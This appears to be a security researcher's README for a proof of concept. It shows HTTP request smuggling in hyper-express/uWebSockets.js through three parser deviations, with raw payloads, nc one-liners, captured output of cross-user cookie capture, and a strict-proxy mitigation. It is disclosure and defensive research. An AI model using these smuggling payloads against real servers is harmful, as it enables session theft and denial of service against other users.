# Does **hyper-express** inherit uWebSockets' HTTP request-smuggling? — end-to-end PoC

This directory reproduces, **empirically and over real TCP**, the HTTP request-smuggling class
documented in [`../../FINDINGS.md`](../../FINDINGS.md) against a **real
[`hyper-express`](https://www.npmjs.com/package/hyper-express) back-end** — the popular Node.js
web framework built on `uWebSockets.js` (the Node binding of the uWebSockets C++ core).

The question answered here: **is a hyper-express application affected by the same parser
disagreements as uWebSockets?** The harness is the same fully-networked one used for the C++
back-end in [`../networked/`](../networked/); only the back-end process is swapped for
`backend_hyperexpress.js`. Every hop is a real socket, so you can also point `curl`/`nc`/Burp at
the proxies.

---

## Versions under test (captured 2026-07-28)

| Component | Version | How resolved |
|-----------|---------|--------------|
| `hyper-express` | **7.0.2** (latest) | `npm install hyper-express`; pinned in [`package.json`](./package.json) |
| `uWebSockets.js` | **20.69.0** | hyper-express dependency: `"uWebSockets.js": "github:uNetworking/uWebSockets.js#v20.69.0"` |
| uWS.js native `source_commit` | `faf115275bb9c55edf739a06406849e42e89ec04` | `node_modules/uWebSockets.js/source_commit` |
| Loaded native addon | `uws_linux_x64_127.node` (Node ABI 127) | Node v22 → `process.versions.modules === 127` |
| Server banner on error | `uWebSockets/20 Server` | observed on the wire (Scenario C 505 body) |

`node -e "console.log(require('uWebSockets.js/package.json').version)"` is blocked by the package's
`exports` map; the version is read from `node_modules/uWebSockets.js/package.json` (`"version":
"20.69.0"`).

## Verdict (summary)

| Scenario | Deviation | Result **through hyper-express** | Cross-user cookie theft? |
|----------|-----------|----------------------------------|--------------------------|
| **A** | empty header name `:` hides `Content-Length` | **POSITIVE — SMUGGLED** | **YES** — victim served `/steal` carrying `victim-secret-cookie` |
| **B** | duplicate `Content-Length` (uWS uses **first**) | **POSITIVE — SMUGGLED** | **YES** — victim served `/steal` carrying `victim-secret-cookie` |
| **C** | chunked `g` = 16 (**F1** off-by-one) | **DESYNC / pool-poisoning** (DoS, not theft) | **NO (DoS)** — uWS.js **accepts** `g`=16 and **over-reads** the chunk; the pooled conn desyncs and the victim gets `505 + Connection: close` |
| **Mitigation** | same attacks via strict proxy | **CLOSED** — A/B → `400`, C → `502`; victim clean `/account` | none reaches the back-end |

**Bottom line:** hyper-express **is affected exactly where uWebSockets.js is**. It performs **no
HTTP parsing of its own** — request line, header set, and body framing are all produced by the
native uWS addon (see [integration analysis](#why-hyper-express-inherits-uwebsocketsjs-parsing)),
so the uWS parser disagreements pass straight through to the app. **All three deviations are present
in the shipping `uWebSockets.js@20.69.0`** (bundled uWS commit `faf1152`); this repo's `src/` was
verified **byte-identical** to upstream uWebSockets `fe7c01a`, so these are real upstream uWebSockets
bugs, not fork artifacts. Scenarios **A and B reproduce identically** (clean cross-user cookie
theft). Scenario **C also reproduces**: the shipping addon **accepts** the `g`=16 chunk size (F1 —
proven directly against the bundled binary [below](#direct-proof-the-shipping-addon-accepts-g16))
and **over-reads** the chunk, so instead of leaving a clean trailing request prefix it corrupts the
pooled connection — the victim gets `505 HTTP Version Not Supported` + `Connection: close`. That is
a request-smuggling-class **desync / connection-pool poisoning** (a denial-of-service flavor) rather
than clean victim-response theft — an artifact of F1's over-read, **not** of any rejection.

---

## Topology

```
                                   ┌──────────────────────────────────────────┐
  attacker ──► :8080 vuln_proxy ───┤  ONE pooled TCP connection, reused        ├──► :9001
  victim   ──► :8080 vuln_proxy ───┤  across ALL clients, bytes forwarded      │    hyper-express
                                   │  VERBATIM (lenient CDN/LB model)          │    (uWebSockets.js)
                                   └──────────────────────────────────────────┘

  attacker ──► :8081 strict_proxy ─►  Go net/http: validates + re-normalizes ──►  :9001
  victim   ──► :8081 strict_proxy ─►  every request; malformed => 400            hyper-express
```

## Components

| File | Role |
|------|------|
| `backend_hyperexpress.js` | **Real hyper-express** server on `:9001`. Catch-all `any('/*')` route; logs and echoes the method / `req.path` / `Cookie` / `X-Smuggled` header of **every request it parses** (`[BACKEND] PARSED …` to stderr, and a `BACKEND-SAW …` response body), so cross-user leakage is directly observable. |
| `vuln_proxy.go` | **Vulnerable** reverse proxy on `:8080`. Holds **one** back-end connection and reuses it for all clients; frames each request by its own lenient parse of `Content-Length`/chunked and forwards the bytes **verbatim**. Models a lenient CDN / load-balancer. |
| `strict_proxy.go` | **Mitigating** reverse proxy on `:8081` (Go `net/http` + `httputil.ReverseProxy`). Parses/validates and re-normalizes every request; malformed ones are rejected with `400` before the back-end. |
| `attacker.go` | Sends ONE crafted request for a chosen case (`a`/`b`/`c`). |
| `victim.go` | Sends ONE normal `GET /account` (`Cookie: victim-secret-cookie`) moments later, over the same pooled connection. Greps the response for `url=/steal` + `victim-secret-cookie`. |
| `run.sh` | Builds everything, `npm install`s if needed, and runs the scenarios. Tracks every background PID and kills **by PID only** (never `pkill -f`). |

The Go files are byte-identical copies of [`../networked/`](../networked/); only the back-end
changed. The `BACKEND-SAW method=<m> url=<u> cookie=<c> x-smuggled=<x>` body format is kept
compatible with `victim.go`'s check.

---

## Requirements

- **Node.js v22+** (hyper-express 7 supports Node 22/24/26; the native addon must match your ABI —
  here `uws_linux_x64_127.node`).
- **Go** 1.18+ (builds the two proxies + attacker + victim).
- Network access for the initial `npm install hyper-express` (done automatically by `run.sh`).

## Quick start

```bash
./run.sh            # all three exploit cases + the mitigation
./run.sh a          # only scenario A
./run.sh b          # only scenario B
./run.sh c          # only scenario C
./run.sh mitigate   # only the strict-proxy mitigation
```

Each case starts a **fresh** back-end + proxy (a fresh pooled connection) so runs are independent
and deterministic. `run.sh` installs a `trap` that kills exactly the PIDs it started on exit.

---

## Scenario A — empty header name hides `Content-Length`  → **POSITIVE (theft)**

**Deviation.** uWebSockets treats a header with an **empty name** (a lone `:` line) as its
end-of-header sentinel, so every following header — including `Content-Length` — is hidden from the
parser. uWS frames the request as **body-less**.

**Attacker's single request** (the trailing bytes are a smuggled request prefix — no `Host`, ends
mid-header so it absorbs the victim's bytes):

```
POST /benign HTTP/1.1\r\n
Host: t\r\n
:\r\n                       ← empty header name: hides the next line from uWS
Content-Length: 33\r\n      ← the proxy sees this; uWS does NOT
\r\n
GET /steal HTTP/1.1\r\nX-Smuggled:      ← 33 bytes; framed as "body" by the proxy
```

**Run:** `./run.sh a` — **verbatim captured output:**

```
════════════════ EXPLOIT CASE a  (attacker → vuln_proxy → pooled hyper-express ← victim) ════════════════
[ATTACKER] case A (empty header name hides Content-Length)
[ATTACKER] response:
HTTP/1.1 200 OK
Date: Tue, 28 Jul 2026 15:11:33 GMT
Content-Length: 56

BACKEND-SAW method=POST url=/benign cookie= x-smuggled=

[VICTIM] sending a normal:  GET /account   (Cookie: victim-secret-cookie)
[VICTIM] response:
HTTP/1.1 200 OK
Date: Tue, 28 Jul 2026 15:11:33 GMT
Content-Length: 95

BACKEND-SAW method=GET url=/steal cookie=victim-secret-cookie x-smuggled=GET /account HTTP/1.1

[VICTIM] *** SMUGGLED *** -> the victim was served the attacker's /steal
         request, and the victim's own cookie was captured into it.
---- hyper-express parsed (ground truth) ----
[BACKEND] hyper-express (uWebSockets.js) listening on 127.0.0.1:9001
[BACKEND] PARSED  req#1 method=POST url=/benign cookie= x-smuggled=
[BACKEND] PARSED  req#2 method=GET url=/steal cookie=victim-secret-cookie x-smuggled=GET /account HTTP/1.1
```

The victim (`GET /account`) is served the response for **`/steal`**, and its own
`Cookie: victim-secret-cookie` was captured into the smuggled request's `X-Smuggled` line
(`x-smuggled=GET /account HTTP/1.1`). **Cross-user cookie theft confirmed through hyper-express.**

---

## Scenario B — duplicate `Content-Length`  → **POSITIVE (theft)**

**Deviation.** uWebSockets accepts two `Content-Length` headers and frames the body using the
**first** (`6`); the lenient proxy uses the **last** (`39`). RFC 9112 requires such a message to be
rejected.

**Attacker's single request:**

```
POST /benign HTTP/1.1\r\n
Host: t\r\n
Content-Length: 6\r\n         ← uWS frames the body with this (first)
Content-Length: 39\r\n        ← the proxy uses this (last)
\r\n
HELLO!GET /steal HTTP/1.1\r\nX-Smuggled:       ← 39 bytes total
```

**Run:** `./run.sh b` — **verbatim captured output:**

```
════════════════ EXPLOIT CASE b  (attacker → vuln_proxy → pooled hyper-express ← victim) ════════════════
[ATTACKER] case B (duplicate Content-Length; uWS uses first=6)
[ATTACKER] response:
HTTP/1.1 200 OK
Date: Tue, 28 Jul 2026 15:11:35 GMT
Content-Length: 56

BACKEND-SAW method=POST url=/benign cookie= x-smuggled=

[VICTIM] sending a normal:  GET /account   (Cookie: victim-secret-cookie)
[VICTIM] response:
HTTP/1.1 200 OK
Date: Tue, 28 Jul 2026 15:11:35 GMT
Content-Length: 95

BACKEND-SAW method=GET url=/steal cookie=victim-secret-cookie x-smuggled=GET /account HTTP/1.1

[VICTIM] *** SMUGGLED *** -> the victim was served the attacker's /steal
         request, and the victim's own cookie was captured into it.
---- hyper-express parsed (ground truth) ----
[BACKEND] hyper-express (uWebSockets.js) listening on 127.0.0.1:9001
[BACKEND] PARSED  req#1 method=POST url=/benign cookie= x-smuggled=
[BACKEND] PARSED  req#2 method=GET url=/steal cookie=victim-secret-cookie x-smuggled=GET /account HTTP/1.1
```

uWS reads only the first **6** body bytes (`HELLO!`) for `/benign`; the remaining `GET /steal…`
becomes the next request and absorbs the victim exactly as in A. **Cross-user cookie theft
confirmed.**

> Note on a harmless JS/native divergence: hyper-express's `req.headers['content-length']` ends up
> `39` (its `forEach`-populated header map keeps the **last** duplicate — see
> [integration analysis](#why-hyper-express-inherits-uwebsocketsjs-parsing)), while the **native uWS
> core frames the body as 6**. The exploit is driven entirely by the native framing; the JS view of
> the header is not consulted for body boundaries, so the divergence does not change the outcome.

---

## Scenario C — chunked `g` = 16 over-read (**F1**)  → **DESYNC / DoS**

**Deviation.** F1 (`ChunkedEncoding.h:57`, `number > 16` instead of `> 15`) makes uWS accept the
non-hex byte `g` (also `G`/`@`) as a chunk-size digit worth 16, so the size line `1g` parses as
`1*16 + 16 = 32`. **This deviation is present in the shipping `uWebSockets.js@20.69.0`** that
hyper-express bundles — proven directly against the bundled binary
[below](#direct-proof-the-shipping-addon-accepts-g16), and consistent with this repo's `src/` being
byte-identical to upstream uWebSockets `fe7c01a`. uWS therefore **over-reads** the chunk body (it
wants 32 bytes where the proxy framed fewer), consumes past the proxy's chunk terminator, and the
pooled stream **desyncs**.

**Attacker's single request:**

```
POST /echo HTTP/1.1\r\n
Host: t\r\n
Transfer-Encoding: chunked\r\n
\r\n
1g\r\n                         ← uWS accepts g=16, so 1g = 32-byte chunk (over-read)
GET /steal HTTP/1.1\r\nX-Smuggled: \r\n
0\r\n\r\n
```

**Run:** `./run.sh c` — **verbatim captured output:**

```
════════════════ EXPLOIT CASE c  (attacker → vuln_proxy → pooled hyper-express ← victim) ════════════════
[ATTACKER] case C (F1 chunked 'g'=16 chunk-size disagreement)
[ATTACKER] response:
HTTP/1.1 200 OK
Date: Tue, 28 Jul 2026 15:11:37 GMT
Content-Length: 54

BACKEND-SAW method=POST url=/echo cookie= x-smuggled=

[VICTIM] sending a normal:  GET /account   (Cookie: victim-secret-cookie)
[VICTIM] response:
HTTP/1.1 505 HTTP Version Not Supported
Connection: close


[VICTIM] desynced/other: see response above and the backend log.
---- hyper-express parsed (ground truth) ----
[BACKEND] hyper-express (uWebSockets.js) listening on 127.0.0.1:9001
[BACKEND] PARSED  req#1 method=POST url=/echo cookie= x-smuggled=
```

**Mechanism.** uWS **accepts** the `1g`=32 chunk size (F1) and reads 32 body bytes for `/echo`,
swallowing the smuggled `GET /steal…` prefix as chunk data, then replies `200` to the attacker.
Because it over-read, the offset where uWS resumes parsing no longer aligns with a request boundary:
when the **victim's** `GET /account` arrives on the *same pooled connection*, uWS parses it starting
mid-stream, sees a malformed request line, and emits:

```
HTTP/1.1 505 HTTP Version Not Supported\r\nConnection: close\r\n\r\n
<h1>HTTP Version Not Supported</h1><p>This server does not support HTTP/1.0.</p><hr><i>uWebSockets/20 Server</i>
```

then **closes** the connection. The victim's request is destroyed and the pooled connection is
poisoned — a request-smuggling-class **denial of service**. This is **not** a rejection of `g`: the
attacker's `/echo` returned `200` and the `PARSED` log shows `/echo` was handled, i.e. the malformed
chunk was **accepted**; F1 over-reads instead of leaving a clean trailing prefix, so it degrades to
DoS rather than the clean cross-user theft of A/B. This matches
[`../../FINDINGS.md`](../../FINDINGS.md), which classifies F1 as a proven parser deviation whose
weaponization requires a front-end that forwards the malformed chunk verbatim.

> **Honest read of C.** The attacker's `200` on `/echo` is emitted synchronously (the handler
> replies before the body finishes), so on its own it doesn't *prove* acceptance — the discriminating
> signal is the **victim's** `505 + close`, the over-read desync signature. A *correct* parser
> (`number > 15`) would `400`/close on the `1g` size line and the victim would instead get an
> **empty** DoS. `victim.go` labels this `desynced/other` (its `*** DENIED (DoS) ***` branch only
> fires on a completely empty response). Either way the pooled connection is destroyed for the victim.
>
> **Validated — no crash, no server-wide DoS.** Case C (and an aggressive over-read that declares a
> 32-byte chunk but sends 4 bytes then closes) sent straight at this hyper-express server does **not**
> crash it — it stays alive and serves fresh connections **8/8** immediately after (the over-read+EOF
> variant aborts the connection cleanly, no segfault). The over-read is *logical* stream mis-framing
> bounded by uSockets' padded recv buffer, not an out-of-bounds read. The DoS is *scoped to co-tenants
> on the poisoned pooled connection*, not a whole-server outage. Full evidence:
> [`../../ECOSYSTEM-IMPACT.md`](../../ECOSYSTEM-IMPACT.md) § "Validated impact of C".

### Direct proof the shipping addon accepts `g`=16

To remove all ambiguity, a differential probe drove the **exact bundled binary**
(`node_modules/uWebSockets.js` — v20.69.0, source commit `faf1152`) with a body-reading handler and
four chunk-size lines, each followed by 16 payload bytes:

```
size-line 'g'  (=16 iff bug)   -> HTTP/1.1 200 OK           | body-reply: 'GOTBODY url=/chunktest bytes=16'
size-line 'G'  (=16 iff bug)   -> HTTP/1.1 200 OK           | body-reply: 'GOTBODY url=/chunktest bytes=16'
size-line '10' (hex 16, valid) -> HTTP/1.1 200 OK           | body-reply: 'GOTBODY url=/chunktest bytes=16'
size-line 'z'  (invalid)       -> HTTP/1.1 400 Bad Request  | body-reply: '<h1>Bad Request</h1>…'
```

`g` and `G` behave **identically to the valid hex `10`** (the addon reads a 16-byte body and runs
the handler), while a genuinely-invalid `z` is correctly `400`ed. That is the `ChunkedEncoding.h`
`number > 16` (should be `> 15`) off-by-one (F1), **proven present in the released npm addon that
hyper-express depends on**, matching the parser-level proof in
[`../../poc/verify_f1_chunked_smuggling.cpp`](../../poc/verify_f1_chunked_smuggling.cpp).

---

## Mitigation — same attacks through the strict proxy  → **CLOSED**

**Run:** `./run.sh mitigate` — **verbatim captured output:**

```
════════════════ MITIGATION  (same attacks through the STRICT proxy :8081) ════════════════
---- attacker case a ----
[ATTACKER] case A (empty header name hides Content-Length)
[ATTACKER] response:
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close
---- attacker case b ----
[ATTACKER] case B (duplicate Content-Length; uWS uses first=6)
[ATTACKER] response:
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close
---- attacker case c ----
[ATTACKER] case C (F1 chunked 'g'=16 chunk-size disagreement)
[ATTACKER] response:
HTTP/1.1 502 Bad Gateway
Date: Tue, 28 Jul 2026 15:11:40 GMT
Content-Length: 0
---- victim (legitimate) ----
[VICTIM] sending a normal:  GET /account   (Cookie: victim-secret-cookie)
[VICTIM] response:
HTTP/1.1 200 OK
Content-Length: 76
Date: Tue, 28 Jul 2026 15:11:39 GMT
Content-Type: text/plain; charset=utf-8

BACKEND-SAW method=GET url=/account cookie=victim-secret-cookie x-smuggled=

[VICTIM] clean: victim received its own /account response.
---- hyper-express parsed (NO /steal, only the legit /account) ----
[BACKEND] hyper-express (uWebSockets.js) listening on 127.0.0.1:9001
[BACKEND] PARSED  req#1 method=POST url=/echo cookie= x-smuggled=
[BACKEND] PARSED  req#2 method=GET url=/account cookie=victim-secret-cookie x-smuggled=
```

A compliant front-end (Go `net/http`) **rejects A and B with `400`** before they reach the
back-end and **re-normalizes C** (surfaced to the attacker as `502`, with only a harmless
re-framed `/echo` reaching uWS). The victim gets a clean `200 /account` and **no `/steal` ever
reaches hyper-express**. The smuggle is fully closed by validating + re-serializing every request
at the edge (and/or not pooling back-end connections across users).

---

## Why hyper-express inherits uWebSockets.js's parsing

hyper-express does **not** implement an HTTP parser. It registers its routes **directly on the uWS
`App`** and wraps the native request/response objects; the request line, the header set, and the
body-chunk boundaries are all produced by the `uWebSockets.js` addon. The relevant integration
points in `node_modules/hyper-express/src/`:

- **Route bridge — `components/Server.js:693`**
  ```js
  return this.#uws_instance[method](pattern, (response, request) => {
      this._handle_uws_request(route, request, response, null);
  });
  ```
  `request` here is the native `uWS.HttpRequest`; hyper-express never re-reads the raw socket.

- **Request line + headers come straight from uWS — `components/http/Request.js:72-77`**
  ```js
  // Cache required values because uWS deallocates HttpRequest after this synchronous callback
  this._query  = raw_request.getQuery();
  this._path   = route.path || raw_request.getUrl();                         // ← uWS getUrl()
  this._method = route.method !== 'ANY' ? route.method : raw_request.getMethod(); // ← uWS getMethod()
  raw_request.forEach((key, value) => (this.headers[key] = value));          // ← uWS header iterator
  ```
  `req.path`, `req.method`, and the entire `req.headers` map are **whatever uWS parsed**. The
  `forEach` copies uWS's header list verbatim (and, for a duplicate header, the last write wins in
  the JS map — the harmless divergence noted in Scenario B). This is exactly why the empty-header
  sentinel (A) and duplicate-`Content-Length` (B) behaviors surface unchanged at the app layer.

- **Handler runs immediately; body framing is uWS's — `components/Server.js:863-864` +
  `components/http/Request.js:232-253`**
  ```js
  if (request._body_parser_run(response, route.max_body_length)) {
      route.handle(request, response);        // handler invoked synchronously, not blocked on body
  }
  ```
  `_body_parser_run` reads `content-length`/`transfer-encoding` **from the uWS-populated
  `this.headers`** and binds uWS's own `this._raw_response.onDataV2(...)` as the **sole** body
  consumer — it does not independently re-frame the body; it trusts uWS's `max_remaining_body_length`
  to decide when the body is complete. So the byte boundary between one request's body and the next
  request is decided entirely by the native uWS core.

- **Send may defer until uWS finishes the body — `components/http/Response.js:688-702`**
  ```js
  if (!this._wrapped_request.received) {
      this._wrapped_request._body_parser_stop();
      this._deferred_send = { body, close_connection };
      this._wrapped_request.once('received', () => { /* atomic re-send */ });
      return this;
  }
  ```
  In Scenario B the `/benign` response is briefly deferred until uWS delivers its 6-byte body and
  signals completion, then sent — after which uWS parses the smuggled `GET /steal`. The response
  is emitted with a fixed `Content-Length` (uWS `res.end(string)`), HTTP/1.1 keep-alive, which is
  what lets the pooled proxy read exactly one framed response and reuse the connection.

**Consequence.** Any HTTP-parsing behavior of `uWebSockets.js` — including request-smuggling parser
disagreements — is inherited **1:1** by hyper-express. hyper-express adds no validation that would
catch the empty-header sentinel or duplicate `Content-Length`, so an app is exploitable to exactly
the degree the underlying `uWebSockets.js` build is. The fix therefore lives in `uWebSockets.js` /
the uWS core (strict header + chunk validation), and/or at a compliant front-end as shown in the
mitigation.

---

## Manual poking

While `./run.sh a` (or any case) leaves a proxy up you can also drive it by hand:

```bash
printf 'POST /benign HTTP/1.1\r\nHost: t\r\n:\r\nContent-Length: 33\r\n\r\nGET /steal HTTP/1.1\r\nX-Smuggled: ' | nc 127.0.0.1 8080
printf 'GET /account HTTP/1.1\r\nHost: t\r\nCookie: victim-secret-cookie\r\n\r\n'                                   | nc 127.0.0.1 8080
```

Or probe the hyper-express back-end directly on `:9001` to see uWS's framing (e.g. the differential
`g`/`z` chunk-size probe from [§ Direct proof](#direct-proof-the-shipping-addon-accepts-g16), which
shows `g`=16 accepted and `z` rejected).

## Faithfulness

The back-end is the **real, unmodified** `hyper-express@7.0.2` + `uWebSockets.js@20.69.0` from npm
(not this repo's patched C++ source). The `vuln_proxy` deliberately models a *lenient* front-end
(verbatim byte-forwarding over a pooled connection) — the class of front-end under which any
back-end parser deviation becomes exploitable; the `strict_proxy` shows a compliant front-end
closes the hole. All three deviations — the empty-header sentinel (A), duplicate `Content-Length` (B), and the
`g`=16 chunk-size over-read (C) — are inherent uWS HTTP-parsing behaviors present in the shipping
npm build (`uWebSockets.js@20.69.0`, bundled uWS commit `faf1152`), and this repo's `src/` was
verified byte-identical to upstream uWebSockets `fe7c01a`. C reproduces as a desync/DoS (F1's
over-read poisons the pooled connection) rather than clean theft — the honest outcome for that bug.
